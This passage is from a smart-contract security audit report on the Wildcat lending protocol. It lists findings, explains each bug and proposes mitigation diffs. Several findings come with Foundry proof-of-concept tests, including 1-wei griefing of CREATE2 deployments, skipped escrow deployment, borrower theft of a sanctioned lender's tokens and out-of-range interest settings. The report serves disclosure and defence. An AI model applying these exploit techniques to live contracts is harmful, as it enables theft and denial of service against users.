# The Wildcat Protocol

The code under review can be found in [2023-10-wildcat](https://github.com/code-423n4/2023-10-wildcat).

## Findings Summary

| ID | Description | Severity |
| :-: | - | :-: |
| [H-01](#h-01-codehash-check-in-factory-contracts-does-not-account-for-non-empty-addresses) | `codehash` check in factory contracts does not account for non-empty addresses | Medium |
| [H-02](#h-02-createescrow-is-called-with-arguments-in-the-wrong-order-in-_blockaccount-and-executewithdrawal) | `createEscrow()` is called with arguments in the wrong order in `_blockAccount()` and `executeWithdrawal()` | Medium |
| [H-03](#h-03-missing-functions-in-wildcatmarketcontroller-limits-the-borrowers-control-over-his-markets) | Missing functions in `WildcatMarketController` limits the borrower's control over his markets | Medium |
| [M-01](#m-01-setannualinterestbips-allows-borrowers-to-set-a-markets-annual-interest-rate-outside-protocol-limits) | `setAnnualInterestBips()` allows borrowers to set a market's annual interest rate outside protocol limits | Medium |
| [M-02](#m-02-setannualinterestbips-can-be-abused-to-keep-a-markets-reserve-ratio-at-90) | `setAnnualInterestBips()` can be abused to keep a market's reserve ratio at 90% | Medium |
| [M-03](#m-03-removing-markets-from-wildcatarchcontroller-gives-lenders-immunity-from-sanctions) | Removing markets from `WildcatArchController` gives lenders immunity from sanctions | Medium |
| [M-04](#m-04-create2withstoredinitcode-does-not-revert-if-contract-deployment-failed) | `create2WithStoredInitCode()` does not revert if contract deployment failed | Medium |
| [M-05](#m-05-collectfees-updates-delinquency-wrongly-as-_writestate-is-called-before-assets-are-transferred) | `collectFees()` updates delinquency wrongly as `_writeState()` is called before assets are transferred | Medium |
| [M-06](#m-06-calculation-for-lender-withdrawals-in-_applywithdrawalbatchpayment-should-not-round-up) | Calculation for lender withdrawals in `_applyWithdrawalBatchPayment()` should not round up | Medium |
| [M-07](#m-07-protocol-markets-are-incompatible-with-rebasing-tokens) | Protocol markets are incompatible with rebasing tokens | Medium |
| [L-01](#l-01-interest-rates-might-be-inflated-slightly-above-the-markets-annual-interest-rate) | Interest rates might be inflated slightly above the market's annual interest rate | Low |
| [L-02](#l-02-deploymarket-might-be-dosed-depending-on-the-origination-fee-configuration) | `deployMarket()` might be DOSed depending on the origination fee configuration | Low |
| [L-03](#l-03-resetreserveratio-cannot-be-called-if-the-market-is-delinquent) | `resetReserveRatio()` cannot be called if the market is delinquent | Low |
| [L-04](#l-04-maximum-amount-of-assets-that-can-be-deposited-into-a-market-is-implicitly-limited-to-uint104) | Maximum amount of assets that can be deposited into a market is implicitly limited to `uint104` | Low |
| [L-05](#l-05-only-allow-lenders-to-call-executewithdrawal-for-themselves) | Only allow lenders to call `executeWithdrawal()` for themselves | Low |
| [N-01](#n-01-avoid-calling-_writestate-before-transferring-assets-in-borrow) | Avoid calling `_writeState()` before transferring assets in `borrow()` | Non-Critical |
| [N-02](#n-02-code-for-push-in-fifoqueuesol-can-be-shortened) | Code for `push()` in `FIFOQueue.sol` can be shortened | Non-Critical |
| [N-03](#n-03-redundant-checks-in-wildcatmarketbases-constructor) | Redundant checks in `WildcatMarketBase`'s constructor | Non-Critical |

## [H-01] `codehash` check in factory contracts does not account for non-empty addresses

### Bug Description

In `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.

The function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:

[WildcatMarketControllerFactory.sol#L287-L296](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L287-L296)

```solidity
    // Salt is borrower address
    bytes32 salt = bytes32(uint256(uint160(msg.sender)));
    controller = LibStoredInitCode.calculateCreate2Address(
      ownCreate2Prefix,
      salt,
      controllerInitCodeHash
    );
    if (controller.codehash != bytes32(0)) { // auditor: This check
      revert ControllerAlreadyDeployed();
    }
```

This same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:

[WildcatMarketController.sol#L349-L353](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L349-L353)

```solidity
    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);
    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);
    if (market.codehash != bytes32(0)) {
      revert MarketAlreadyDeployed();
    }
```

This check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:

[WildcatSanctionsSentinel.sol#L104-L106](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L104-L106)

```solidity
    escrowContract = getEscrowAddress(borrower, account, asset);

    if (escrowContract.codehash != bytes32(0)) return escrowContract;
```

However, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.

According to [EIP-1052](https://eips.ethereum.org/EIPS/eip-1052), addresses without code only return a `0x0` codehash when they are **empty**:
> In case the account does not exist or is empty (as defined by [EIP-161](https://eips.ethereum.org/EIPS/eip-161)) `0` is pushed to the stack.
>
> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.

As seen from above, addresses without code can also return `keccak256("")` as its codehash if it is non-empty. [EIP-161](https://eips.ethereum.org/EIPS/eip-161) states that an address must have a zero ETH balance for it to be empty:

> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.

As such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256("")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.

Since all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:
- For controller deployments:
  - Attacker calls [`computeControllerAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L342-L347) to compute the controller address for a borrower.
  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.
  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.
- For market deployments:
  - Attacker calls [`computeMarketAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L221-L228) with arguments such that the deployment salt is the same. 
  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.
  - When `deployMarket()` is called by the borrower, the function reverts.
- For escrow deployments:
  - Attacker calls [`getEscrowAddress()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L61-L85) with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.
  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.
  - When either [`nukeFromOrbit()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L74-L81) or [`executeWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L123-L188) is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.
  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.

Note that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.

### Impact

An attacker can do the following at the cost of 1 wei and some gas:

- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.
- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.
- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.

### Proof of Concept

The code below contains three tests:
- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.
- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.
- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatSanctionsSentinel.sol';
import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';
import 'src/interfaces/IWildcatMarketControllerEventsAndErrors.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract CodeHashTest is Test, IWildcatMarketControllerEventsAndErrors {
    // Wildcat contracts
    address MOCK_CHAINALYSIS_ADDRESS = address(0x1337);
    WildcatSanctionsSentinel sentinel;
    WildcatArchController archController;
    WildcatMarketControllerFactory controllerFactory;
    
    // Test contracts
    MockERC20 asset;

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        archController = new WildcatArchController();
        sentinel = new WildcatSanctionsSentinel(address(archController), MOCK_CHAINALYSIS_ADDRESS);
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(sentinel),
            constraints
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Deploy asset token
        asset = new MockERC20();

        // Setup Aiken and register him as borrower
        AIKEN = makeAddr("AIKEN");
        archController.registerBorrower(AIKEN);

        // Setup Dueet and give him some asset token
        DUEET = makeAddr("DUEET");
        asset.mint(DUEET, 1000e18);
    }

    function test_CanDOSControllerDeployment() public {
        // Dueet front-runs Aiken and transfers 1 wei to Aiken's controller address
        address controllerAddress = controllerFactory.computeControllerAddress(AIKEN);
        payable(controllerAddress).transfer(1);

        // Codehash of Aiken's controller address is now keccak256("")
        assertEq(controllerAddress.codehash, keccak256(""));

        // Aiken calls deployController(), but it reverts due to non-zero codehash
        vm.prank(AIKEN);
        vm.expectRevert(WildcatMarketControllerFactory.ControllerAlreadyDeployed.selector);
        controllerFactory.deployController();
    }

    function test_CanDOSMarketDeployment() public {
        // Deploy WildcatMarketController for Aiken
        (WildcatMarketController controller, ) = _deployControllerAndMarket(
            AIKEN,
            address(0),
            "_",
            "_"
        );

        // Dueet front-runs Aiken and transfers 1 wei to market address
        string memory namePrefix = "Market Token";
        string memory symbolPrefix = "MKT";
        address marketAddress = controller.computeMarketAddress(
            address(asset), 
            namePrefix, 
            symbolPrefix
        );
        payable(marketAddress).transfer(1);

        // Codehash of market address is now keccak256("")
        assertEq(marketAddress.codehash, keccak256(""));

        // Aiken calls deployMarket(), but it reverts due to non-zero codehash
        vm.prank(AIKEN);
        vm.expectRevert(MarketAlreadyDeployed.selector);
        controller.deployMarket(
            address(asset),
            namePrefix,
            symbolPrefix,
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
    }

    function test_CanSkipEscrowDeployment() public {
        // Deploy WildcatMarketController and WildcatMarket for Aiken
        (WildcatMarketController controller, WildcatMarket market) = _deployControllerAndMarket(
            AIKEN,
            address(asset),
            "Market Token",
            "MKT"
        );

        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);

        // Dueet becomes a lender in the market
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Dueet becomes sanctioned
        vm.mockCall(
            MOCK_CHAINALYSIS_ADDRESS,
            abi.encodeCall(IChainalysisSanctionsList.isSanctioned, (DUEET)),
            abi.encode(true)
        );

        // Attacker transfers 1 wei to Dueet's escrow address
        // Note: Borrower and lender addresses are swapped due to a separate bug
        address escrowAddress = sentinel.getEscrowAddress(DUEET, AIKEN, address(market));
        payable(escrowAddress).transfer(1);

        // Codehash of market address is now keccak256("")
        assertEq(escrowAddress.codehash, keccak256(""));

        // Dueet gets blocked in market
        market.nukeFromOrbit(DUEET);

        // Dueet's MKT tokens are transferred to his escrow address
        assertEq(market.balanceOf(escrowAddress), 1000e18);

        // However, the escrow contract was not deployed
        assertEq(escrowAddress.code.length, 0); 
    }

    function _deployControllerAndMarket(
        address user, 
        address _asset,
        string memory namePrefix, 
        string memory symbolPrefix
    ) internal returns (WildcatMarketController, WildcatMarket){
        vm.prank(user);
        (address controller, address market) = controllerFactory.deployControllerAndMarket(
            namePrefix,
            symbolPrefix,
            _asset,
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        return (WildcatMarketController(controller), WildcatMarket(market));
    }
}
```

### Recommended Mitigation

Consider checking if the codehash of an address is not `keccak256("")` as well:

[WildcatMarketControllerFactory.sol#L294-L296](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L294-L296)

```diff
-   if (controller.codehash != bytes32(0)) {
+   if (controller.codehash != bytes32(0) && controller.codehash != keccak256("")) {
      revert ControllerAlreadyDeployed();
    }
```

[WildcatMarketController.sol#L351-L353](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L351-L353)

```diff
-   if (market.codehash != bytes32(0)) {
+   if (market.codehash != bytes32(0) && market.codehash != keccak256("")) {
      revert MarketAlreadyDeployed();
    }
```

[WildcatSanctionsSentinel.sol#L106](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L106)

```diff
-   if (escrowContract.codehash != bytes32(0)) return escrowContract;
+   if (escrowContract.codehash != bytes32(0)) && escrowContract.codehash != keccak256("") return escrowContract;
```

Alternatively, use `<address>.code.length != 0` to check if an address has code instead.

## [H-02] `createEscrow()` is called with arguments in the wrong order in `_blockAccount()` and `executeWithdrawal()`

### Bug Description

In `WildcatSanctionsSentinel.sol`, `createEscrow()` takes in a `borrower`, `account` and `asset` address, which is used to deploy an escrow contract for the `account`: 

[WildcatSanctionsSentinel.sol#L95-L99](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L95-L99)

```solidity
  function createEscrow(
    address borrower,
    address account,
    address asset
  ) public override returns (address escrowContract) {
```

However, in `WildcatMarketBase.sol`, `_blockAccount()` calls `createEscrow()` with arguments in the wrong order:

[WildcatMarketBase.sol#L172-L176](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L172-L176)

```solidity
        address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
          accountAddress,
          borrower,
          address(this)
        );
```

Similarly, in `WildcatMarketWithdrawals.sol`, `executeWithdrawal()` calls `createEscrow()` with arguments in the wrong order as well:

[WildcatMarketWithdrawals.sol#L166-L170](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L166-L170)

```solidity
      address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
        accountAddress,
        borrower,
        address(asset)
      );
```

Where:
- `accountAddress` is the address of the sanctioned lender.

As seen from above, the address of the borrower and lender are swapped. This causes the market tokens and/or assets of the sanctioned lender to be incorrectly deposited into the borrower's escrow contract when either [`nukeFromOrbit()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L74-L81) or [`executeWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L123-L188) is called, allowing the borrower to withdraw the lender's funds.

### Impact

When a lender is sanctioned by Chainalysis, a market's borrower can call [`nukeFromOrbit()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L74-L81) or [`executeWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L123-L188) for the lender to steal all his funds.

### Proof of Concept

The following Foundry test demonstrates how `nukeFromOrbit()` creates an escrow contract for the borrower instead of the lender, allowing the borrower to steal the lender's market tokens:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatSanctionsSentinel.sol';
import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';
import 'src/WildcatSanctionsEscrow.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract CreaetEscrowIncorrectArgumentsTest is Test {
    // Wildcat contracts
    WildcatSanctionsSentinel sentinel;
    WildcatArchController archController;
    WildcatMarketControllerFactory controllerFactory;
    WildcatMarketController controller;
    WildcatMarket market;
    
    // Test contracts
    MockChainalysis chainalysis = new MockChainalysis();
    MockERC20 asset = new MockERC20();

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        archController = new WildcatArchController();
        sentinel = new WildcatSanctionsSentinel(address(archController), address(chainalysis));
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(sentinel),
            constraints
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup Aiken and register him as borrower
        AIKEN = makeAddr("AIKEN");
        archController.registerBorrower(AIKEN);

        // Setup Dueet and give him some asset token
        DUEET = makeAddr("DUEET");
        asset.mint(DUEET, 1000e18);

        // Deploy controller and market for Aiken
        vm.prank(AIKEN);
        (address _controller, address _market) = controllerFactory.deployControllerAndMarket(
            "Market Token",
            "MKT",
            address(asset),
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        controller = WildcatMarketController(_controller);
        market = WildcatMarket(_market);
    }

    function test_blockAccountDeploysEscrowWrongly() public {
        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);

        // Dueet becomes a lender in the market
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Dueet becomes sanctioned
        chainalysis.sanction(DUEET);

        // Dueet gets blocked in market
        market.nukeFromOrbit(DUEET);

        // Borrower and lender is swapped in the deployed escrow contract
        address escrowAddress = sentinel.getEscrowAddress(DUEET, AIKEN, address(market));
        WildcatSanctionsEscrow escrow = WildcatSanctionsEscrow(escrowAddress);
        assertEq(escrow.account(), AIKEN);
        assertEq(escrow.borrower(), DUEET);
        
        // Aiken withdraws Dueet's market tokens from the escrow
        escrow.releaseEscrow();
        assertEq(market.balanceOf(AIKEN), 1000e18);
    }
}

contract MockChainalysis {
    mapping(address => bool) public isSanctioned;

    function sanction(address addr) external {
        isSanctioned[addr] = true;
    }
}
```

### Recommended Mitigation

In `_blockAccount()` and `executeWithdrawal()`, call `createEscrow()` with arguments in the correct order:

[WildcatMarketBase.sol#L172-L176](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L172-L176)

```diff
        address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
-         accountAddress,
          borrower,
+         accountAddress,
          address(this)
        );
```

[WildcatMarketWithdrawals.sol#L166-L170](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L166-L170)

```diff
      address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
-       accountAddress,
        borrower,
+       accountAddress,
        address(asset)
      );
```

## [H-03] Missing functions in `WildcatMarketController` limits the borrower's control over his markets

### Bug Description

In markets, the following functions can only be called by the borrower's `WildcatMarketController` contract as they have the `onlyController` modifier:

- `setMaxTotalSupply()` in `WildcatMarketConfig.sol`:

[WildcatMarketConfig.sol#L134](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L134)

```solidity
  function setMaxTotalSupply(uint256 _maxTotalSupply) external onlyController nonReentrant {
```

- `closeMarket()` in `WildcatMarket.sol`

[WildcatMarket.sol#L142](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L142)

```solidity
  function closeMarket() external onlyController nonReentrant {
```

However, in [`WildcatMarketController.sol`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol), these functions are not called anywhere in the code.

### Impact

As `WildcatMarketController.sol` has missing functions, a market's `maxTotalSupply` cannot be changed after deployment, even if the borrower wishes to borrow more assets.

Additionally, the borrower has no way of closing a market, even if he does not wish to borrow anymore funds.

### Recommended Mitigation

Add the missing functions in `WildcatMarketController.sol` so that borrowers can call `setMaxTotalSupply()` and `closeMarket()`.

## [M-01] `setAnnualInterestBips()` allows borrowers to set a market's annual interest rate outside protocol limits

### Bug Description

Whenever a market is deployed using [`deployMarket()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L269-L360), `enforceParameterConstraints()` checks that `annualInterestBips` is within the protocol's limits, defined by `MinimumAnnualInterestBips` and `MaximumAnnualInterestBips`:

[WildcatMarketController.sol#L410-L415](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L410-L415)

```solidity
    assertValueInRange(
      annualInterestBips,
      MinimumAnnualInterestBips,
      MaximumAnnualInterestBips,
      AnnualInterestBipsOutOfBounds.selector
    );
```

However, the [`setAnnualInterestBips()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L463-L488) function, which can be called by the borrower to change a market's `annualInterestBips` post-deployment, does not check that the new annual interest rate is within the protocol's limits.

### Impact

A borrower can call `setAnnualInterestBips()` to set a market's annual interest rate outside the range defined by the protocol.

### Proof of Concept

The following test demonstrates how `setAnnualInterestBips()` can be called to set a market's `annualInterestBips` above the protocol's `maximumAnnualInterestBips`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract MarketAnnualInterestRateTest is Test {
    // Wildcat contracts
    WildcatArchController archController;
    
    // Test contracts
    MockERC20 asset = new MockERC20();

    function setUp() external {
        // Deploy Wildcat contracts
        archController = new WildcatArchController();
    }

    function test_canSetAnnualInterestOutsideMinMaxRange() public {
        // Setup controllerFactory with maximum annual interest rate as 50%
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: 5_000 // Protocol annual interest rate limit is 50%
        });
        WildcatMarketControllerFactory controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(0),
            constraints
        );
        archController.registerControllerFactory(address(controllerFactory));
        archController.registerBorrower(address(this));

        // Deploy controller and market
        (address _controller, address _market) = controllerFactory.deployControllerAndMarket(
            "Market Token",
            "MKT",
            address(asset),
            type(uint128).max,
            5_000, // 50%
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        WildcatMarketController controller = WildcatMarketController(_controller);
        WildcatMarket market = WildcatMarket(_market);

        // Can set market's annual interest rate to 100%
        controller.setAnnualInterestBips(address(market), 10_000);

        // Market's annual interest rate is now above protocol's 50% limit
        assertGt(market.annualInterestBips(), 5_000);
    }
}
```

### Recommended Mitigation

In `setAnnualInterestBips()`, check that `annualInterestBips` is within `MinimumAnnualInterestBips` and `MaximumAnnualInterestBips`:

[WildcatMarketController.sol#L468-L471](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L468-L471)

```diff
  function setAnnualInterestBips(
    address market,
    uint16 annualInterestBips
  ) external virtual onlyBorrower onlyControlledMarket(market) {
+   if (annualInterestBips < MinimumAnnualInterestBips || annualInterestBips > MaximumAnnualInterestBips) {
+     revert AnnualInterestBipsOutOfBounds(); 
+   }
```

## [M-02] `setAnnualInterestBips()` can be abused to keep a market's reserve ratio at 90%

### Bug Description

If a borrower calls `setAnnualInterestBips()` to reduce a market's annual interest rate, its reserve ratio will be set to 90% for 2 weeks:

[WildcatMarketController.sol#L472-L485](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L472-L485)

```solidity
    // If borrower is reducing the interest rate, increase the reserve
    // ratio for the next two weeks.
    if (annualInterestBips < WildcatMarket(market).annualInterestBips()) {
      TemporaryReserveRatio storage tmp = temporaryExcessReserveRatio[market];

      if (tmp.expiry == 0) {
        tmp.reserveRatioBips = uint128(WildcatMarket(market).reserveRatioBips());

        // Require 90% liquidity coverage for the next 2 weeks
        WildcatMarket(market).setReserveRatioBips(9000);
      }

      tmp.expiry = uint128(block.timestamp + 2 weeks);
    }
```

This is meant to give lenders the option to withdraw from the market should they disagree with the decrease in annual interest rate.


However, such an implementation can be abused by a borrower in a market where the reserve ratio above 90%:

1. Borrower deploys a market with its reserve ratio at 95%.
2. A lender, who agrees to a 95% reserve ratio, deposits into the market.
3. Borrower calls `setAnnualInterestBips()` to reduce `annualInterestBips` by 1.
   - This causes the market's reserve ratio to be set to 90% for 2 weeks.
4. After 2 weeks, the borrower calls `setAnnualInterestBips()` and decreases `annualInterestBips` by 1 again.
5. By repeating steps 3 and 4, the borrower can effectively keep the market's reserve ratio at 90% forever. 

In the scenario above, the 5% reduction in reserve ratio works in favor of the borrower since he does not have to keep as much assets in the market. The amount of assets that all lenders can withdraw at any given time will also be 5% less than what it should be.

Note that it is possible for a market to be deployed with a reserve ratio above 90% if the protocol's `MaximumReserveRatioBips` permits. For example, `MaximumReserveRatioBips` is set to 100% in current tests:

[TestConstants.sol#L21](https://github.com/code-423n4/2023-10-wildcat/blob/main/test/shared/TestConstants.sol#L21)

```solidity
uint16 constant MaximumReserveRatioBips = 10_000;
```

### Impact

In a market where the reserve ratio is above 90%, a borrower repeatedly call `setAnnualInterestBips()` every two weeks to keep the reserve ratio at 90%.

This is problematic as a market's reserve ratio is not meant to be adjustable post-deployment, since the borrower and his lenders must agree to a fixed reserve ratio beforehand.

### Recommended Mitigation

In `setAnnualInterestBips()`, consider setting the market's reserve ratio to 90% only if it is lower:

[WildcatMarketController.sol#L472-L485](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L472-L485)

```diff
    // If borrower is reducing the interest rate, increase the reserve
    // ratio for the next two weeks.
-   if (annualInterestBips < WildcatMarket(market).annualInterestBips()) {
+   if (annualInterestBips < WildcatMarket(market).annualInterestBips() && WildcatMarket(market).reserveRatioBips() < 9000) {
      TemporaryReserveRatio storage tmp = temporaryExcessReserveRatio[market];

      if (tmp.expiry == 0) {
        tmp.reserveRatioBips = uint128(WildcatMarket(market).reserveRatioBips());

        // Require 90% liquidity coverage for the next 2 weeks
        WildcatMarket(market).setReserveRatioBips(9000);
      }

      tmp.expiry = uint128(block.timestamp + 2 weeks);
    }
```

## [M-03] Removing markets from `WildcatArchController` gives lenders immunity from sanctions

### Bug Description

In `WildcatSanctionsSentinel.sol`, the `createEscrow()` function checks that `msg.sender` is a registered market in the `WildcatArchController` contract:

[WildcatSanctionsSentinel.sol#L95-L102](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L95-L102)

```solidity
  function createEscrow(
    address borrower,
    address account,
    address asset
  ) public override returns (address escrowContract) {
    if (!IWildcatArchController(archController).isRegisteredMarket(msg.sender)) {
      revert NotRegisteredMarket();
    }
```

This is meant to ensure that `createEscrow()` can only be called by markets deployed by the protocol, since they are registered using [`registerMarket()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatArchController.sol#L192-L197).

However, such an implementation does not account for markets that are removed using the [`removeMarket()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatArchController.sol#L199-L204) function.

If a market is removed, it should still be able to operate normally as a registered market would. However, due to the check shown above, any function that calls `createEscrow()` will always revert for removed markets, namely [`nukeFromOrbit()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L74-L81) and [`executeWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L123-L188) when they are called for sanctioned lenders.

### Impact

